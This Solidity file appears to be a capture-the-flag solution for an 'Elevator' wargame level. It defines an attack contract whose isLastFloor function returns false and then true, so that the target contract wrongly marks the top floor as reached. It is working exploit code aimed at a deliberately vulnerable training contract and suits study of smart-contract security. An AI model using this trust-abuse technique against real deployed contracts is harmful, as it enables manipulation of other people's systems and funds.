// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "../../../src/levels/11-Elevator/Elevator.sol";

contract ElevatorAttack is Building {
    Elevator e;
    uint256 seqNum;

    constructor(address _target) {
        e = Elevator(_target);
    }

    function isLastFloor(uint256) external returns (bool) {
        // if called for the first time, return false
        if (seqNum == 0) {
            unchecked {
                ++seqNum;
            }
            return false;
        }
        // else return true to make top true
        return true;
    }

    function attackElevator() external {
        e.goTo(1);
    }
}
